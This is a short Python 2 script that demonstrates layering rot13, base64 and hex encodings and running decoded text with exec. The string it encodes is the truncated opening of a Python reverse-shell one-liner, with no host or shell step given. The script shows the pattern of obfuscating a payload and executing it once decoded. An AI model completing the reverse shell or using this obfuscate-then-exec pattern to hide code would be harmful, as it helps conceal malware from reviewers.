# base64, hex, bz2, zip

code = "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\""

encoded = code.encode("rot_13").encode("base64").encode("hex")
print encoded

decoded = encoded.decode("hex").decode("base64").decode("rot_13")
print decoded

hello = "print \"Hello World\""
hello = hello.encode("hex")
exec(hello.decode("hex"))
